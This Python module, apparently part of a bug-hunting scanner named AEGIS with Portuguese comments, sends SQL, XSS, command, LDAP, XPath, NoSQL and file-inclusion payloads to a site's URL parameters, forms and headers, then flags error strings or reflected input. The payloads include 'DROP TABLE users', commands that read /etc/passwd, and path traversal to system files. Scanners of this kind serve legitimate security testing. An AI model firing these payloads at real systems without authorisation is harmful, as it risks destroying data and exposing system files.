"""
AEGIS Bug Hunter - Injection Finder
Módulo responsável por encontrar possíveis pontos de injeção
"""

import os
import json
import requests
import time
import random
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime

def gerar_payloads_teste():
    """Gera payloads de teste para diferentes tipos de injeção"""
    payloads = {
        "sql_injection": [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "admin'--",
            "admin'/*"
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<<SCRIPT>alert('XSS')</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ],
        "command_injection": [
            "; ls",
            "| whoami",
            "&& cat /etc/passwd",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "| ping -c 1 127.0.0.1",
            "&& ping -c 1 127.0.0.1"
        ],
        "ldap_injection": [
            "*",
            "*)(&",
            "*)(uid=*",
            "*)(|(uid=*",
            "*))%00",
            "admin)(&(password=*",
            "*)(|(password=*",
            "*)(|(cn=*"
        ],
        "xpath_injection": [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "' or position()=1 or ''='",
            "' or contains(name(),'admin') or ''='",
            "' or substring(name(),1,1)='a' or ''='"
        ],
        "nosql_injection": [
            "true, $where: '1 == 1'",
            ", $where: '1 == 1'",
            "$where: '1 == 1'",
            "', $where: '1 == 1', $comment: '",
            "'; return true; var dummy='",
            "'; return true; //",
            "1; return true",
            "'; return(true); var dum='",
            "1'; return true; var dum='",
            "1; return true; //"
        ]
    }
    return payloads

def testar_parametros_url(target_url):
    """Testa parâmetros na URL para injeções"""
    resultados = []
    
    parsed_url = urlparse(target_url)
    if not parsed_url.query:
        return resultados
    
    parametros = parse_qs(parsed_url.query)
    payloads = gerar_payloads_teste()
    
    print(f"[inject_finder] 🔍 Testando {len(parametros)} parâmetros na URL")
    
    for param_name, param_values in parametros.items():
        for tipo_payload, lista_payloads in payloads.items():
            for payload in lista_payloads[:3]:  # Limita para não ser muito agressivo
                try:
                    # Cria nova URL com payload
                    novos_params = parametros.copy()
                    novos_params[param_name] = [payload]
                    nova_query = urlencode(novos_params, doseq=True)
                    nova_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{nova_query}"
                    
                    # Faz requisição
                    response = requests.get(nova_url, timeout=5)
                    
                    # Analisa resposta
                    vulnerabilidade_detectada = analisar_resposta_vulnerabilidade(
                        response, payload, tipo_payload
                    )
                    
                    if vulnerabilidade_detectada:
                        resultado = {
                            "tipo": "parametro_url",
                            "parametro": param_name,
                            "payload": payload,
                            "tipo_injecao": tipo_payload,
                            "url_teste": nova_url,
                            "status_code": response.status_code,
                            "evidencia": vulnerabilidade_detectada,
                            "timestamp": datetime.now().isoformat()
                        }
                        resultados.append(resultado)
                        print(f"[inject_finder] 🚨 Possível {tipo_payload} em {param_name}")
                    
                    # Delay para evitar rate limiting
                    time.sleep(random.uniform(0.5, 1.5))
                    
                except Exception as e:
                    continue
    
    return resultados

def testar_formularios(target_url, formularios):
    """Testa formulários para injeções"""
    resultados = []
    payloads = gerar_payloads_teste()
    
    print(f"[inject_finder] 📝 Testando {len(formularios)} formulários")
    
    for form in formularios:
        if not form.get("url_completa") or not form.get("campos"):
            continue
        
        for tipo_payload, lista_payloads in payloads.items():
            for payload in lista_payloads[:2]:  # Limita payloads por formulário
                try:
                    # Prepara dados do formulário
                    form_data = {}
                    for campo in form["campos"]:
                        if campo.get("name"):
                            if campo.get("type") == "hidden":
                                form_data[campo["name"]] = campo.get("value", "")
                            else:
                                form_data[campo["name"]] = payload
                    
                    # Faz requisição
                    if form["method"] == "POST":
                        response = requests.post(form["url_completa"], data=form_data, timeout=5)
                    else:
                        response = requests.get(form["url_completa"], params=form_data, timeout=5)
                    
                    # Analisa resposta
                    vulnerabilidade_detectada = analisar_resposta_vulnerabilidade(
                        response, payload, tipo_payload
                    )
                    
                    if vulnerabilidade_detectada:
                        resultado = {
                            "tipo": "formulario",
                            "form_action": form["url_completa"],
                            "form_method": form["method"],
                            "payload": payload,
                            "tipo_injecao": tipo_payload,
                            "status_code": response.status_code,
                            "evidencia": vulnerabilidade_detectada,
                            "timestamp": datetime.now().isoformat()
                        }
                        resultados.append(resultado)
                        print(f"[inject_finder] 🚨 Possível {tipo_payload} em formulário")
                    
                    # Delay para evitar rate limiting
                    time.sleep(random.uniform(0.5, 1.5))
                    
                except Exception as e:
                    continue
    
    return resultados

def testar_headers_injection(target_url):
    """Testa injeção em headers HTTP"""
    resultados = []
    
    headers_teste = [
        "User-Agent",
        "Referer", 
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Client-IP"
    ]
    
    payloads_headers = [
        "<script>alert('XSS')</script>",
        "'; DROP TABLE users; --",
        "$(whoami)",
        "../../../etc/passwd",
        "{{7*7}}"
    ]
    
    print(f"[inject_finder] 📡 Testando injeção em headers")
    
    for header_name in headers_teste:
        for payload in payloads_headers:
            try:
                headers = {header_name: payload}
                response = requests.get(target_url, headers=headers, timeout=5)
                
                # Verifica se o payload aparece na resposta
                if payload in response.text or payload in str(response.headers):
                    resultado = {
                        "tipo": "header_injection",
                        "header": header_name,
                        "payload": payload,
                        "status_code": response.status_code,
                        "evidencia": f"Payload refletido na resposta",
                        "timestamp": datetime.now().isoformat()
                    }
                    resultados.append(resultado)
                    print(f"[inject_finder] 🚨 Possível header injection em {header_name}")
                
                time.sleep(random.uniform(0.3, 1.0))
                
            except Exception as e:
                continue
    
    return resultados

def analisar_resposta_vulnerabilidade(response, payload, tipo_payload):
    """Analisa a resposta para detectar vulnerabilidades"""
    response_text = response.text.lower()
    response_headers = str(response.headers).lower()
    
    # Indicadores por tipo de injeção
    indicadores = {
        "sql_injection": [
            "sql syntax",
            "mysql_fetch",
            "ora-01756",
            "microsoft ole db",
            "odbc sql server driver",
            "postgresql query failed",
            "warning: mysql",
            "valid mysql result",
            "mysqlclient",
            "syntax error"
        ],
        "xss": [
            payload.lower() in response_text,
            payload.lower() in response_headers
        ],
        "command_injection": [
            "uid=",
            "gid=",
            "groups=",
            "root:",
            "/bin/bash",
            "/bin/sh",
            "command not found",
            "ping statistics"
        ],
        "ldap_injection": [
            "ldap_search",
            "ldap error",
            "invalid dn syntax",
            "ldap: error code"
        ],
        "xpath_injection": [
            "xpath syntax error",
            "xpath expression",
            "xmlxpatheval",
            "xpath error"
        ],
        "nosql_injection": [
            "mongodb",
            "bson",
            "couchdb",
            "redis error",
            "syntax error near"
        ]
    }
    
    if tipo_payload in indicadores:
        for indicador in indicadores[tipo_payload]:
            if isinstance(indicador, bool):
                if indicador:
                    return "Payload refletido na resposta"
            elif isinstance(indicador, str):
                if indicador in response_text or indicador in response_headers:
                    return f"Indicador encontrado: {indicador}"
    
    # Verifica mudanças no status code que podem indicar vulnerabilidade
    if response.status_code == 500:
        return "Erro interno do servidor (possível injeção)"
    
    return None

def testar_file_inclusion(target_url):
    """Testa vulnerabilidades de inclusão de arquivos"""
    resultados = []
    
    payloads_lfi = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "php://filter/read=convert.base64-encode/resource=index.php"
    ]
    
    # Testa apenas se houver parâmetros na URL
    parsed_url = urlparse(target_url)
    if not parsed_url.query:
        return resultados
    
    parametros = parse_qs(parsed_url.query)
    
    print(f"[inject_finder] 📁 Testando inclusão de arquivos")
    
    for param_name in parametros.keys():
        for payload in payloads_lfi:
            try:
                novos_params = parametros.copy()
                novos_params[param_name] = [payload]
                nova_query = urlencode(novos_params, doseq=True)
                nova_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{nova_query}"
                
                response = requests.get(nova_url, timeout=5)
                
                # Verifica indicadores de LFI
                if ("root:" in response.text and "/bin/" in response.text) or \
                   ("# localhost" in response.text and "127.0.0.1" in response.text):
                    resultado = {
                        "tipo": "file_inclusion",
                        "parametro": param_name,
                        "payload": payload,
                        "url_teste": nova_url,
                        "status_code": response.status_code,
                        "evidencia": "Conteúdo de arquivo sistema detectado",
                        "timestamp": datetime.now().isoformat()
                    }
                    resultados.append(resultado)
                    print(f"[inject_finder] 🚨 Possível LFI em {param_name}")
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                continue
    
    return resultados

def executar(target_url):
    """Executa busca completa por pontos de injeção"""
    print(f"[inject_finder] 🔍 Buscando vetores de injeção em: {target_url}")
    
    resultados_finais = {
        "target_url": target_url,
        "timestamp": datetime.now().isoformat(),
        "vulnerabilidades_encontradas": [],
        "total_testes": 0,
        "total_vulnerabilidades": 0
    }
    
    try:
        # Carrega dados do parser se disponível
        site_name = target_url.replace('https://', '').replace('http://', '').replace('/', '_')
        parser_file = f"output/{site_name}/parser.json"
        formularios = []
        
        if os.path.exists(parser_file):
            with open(parser_file, 'r', encoding='utf-8') as f:
                parser_data = json.load(f)
                formularios = parser_data.get("formularios", [])
        
        # Executa testes
        print(f"[inject_finder] 🧪 Iniciando testes de injeção...")
        
        # Testa parâmetros URL
        vulns_url = testar_parametros_url(target_url)
        resultados_finais["vulnerabilidades_encontradas"].extend(vulns_url)
        
        # Testa formulários
        vulns_forms = testar_formularios(target_url, formularios)
        resultados_finais["vulnerabilidades_encontradas"].extend(vulns_forms)
        
        # Testa headers
        vulns_headers = testar_headers_injection(target_url)
        resultados_finais["vulnerabilidades_encontradas"].extend(vulns_headers)
        
        # Testa file inclusion
        vulns_lfi = testar_file_inclusion(target_url)
        resultados_finais["vulnerabilidades_encontradas"].extend(vulns_lfi)
        
        # Calcula estatísticas
        resultados_finais["total_vulnerabilidades"] = len(resultados_finais["vulnerabilidades_encontradas"])
        resultados_finais["tipos_encontrados"] = list(set([v["tipo_injecao"] if "tipo_injecao" in v else v["tipo"] for v in resultados_finais["vulnerabilidades_encontradas"]]))
        
        # Salva resultado
        output_dir = f"output/{site_name}"
        os.makedirs(output_dir, exist_ok=True)
        
        arquivo_saida = f"{output_dir}/injects.json"
        with open(arquivo_saida, "w", encoding="utf-8") as f:
            json.dump(resultados_finais, f, indent=4, ensure_ascii=False)
        
        print(f"[inject_finder] ✅ Testes finalizados")
        print(f"[inject_finder] 🚨 {resultados_finais['total_vulnerabilidades']} possíveis vulnerabilidades detectadas")
        if resultados_finais["tipos_encontrados"]:
            print(f"[inject_finder] 📋 Tipos encontrados: {', '.join(resultados_finais['tipos_encontrados'])}")
        print(f"[inject_finder] 💾 Resultado salvo em: {arquivo_saida}")
        
        return resultados_finais
        
    except Exception as e:
        print(f"[inject_finder] ❌ Erro durante os testes: {str(e)}")
        return {"erro": str(e)}

